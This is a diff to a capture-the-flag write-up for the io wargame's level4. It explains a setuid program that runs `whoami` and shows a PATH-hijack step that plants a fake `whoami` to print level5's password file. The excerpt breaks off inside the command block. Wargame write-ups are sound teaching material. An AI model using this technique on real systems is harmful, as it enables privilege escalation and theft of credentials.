@@ -21,11 +21,13 @@ int main() {
 }
 ```
 The program simply runs `whoami`, gets the result, and print's "Welcome 
-<username>". Because it says "Welcome level5", we know this is a setuid 
+\<username>". Because it says "Welcome level5", we know this is a setuid 
 program.
+
 This vulnerability is simple: we can edit the `PATH` environment variable 
 to add our own `whoami` command that prints the pass rather than the current
 user:
+
 ```
 level4@io:/levels$ mkdir /tmp/msimwashere
 level4@io:/levels$ echo "cat /home/level5/.pass" > /tmp/msimwashere/whoami
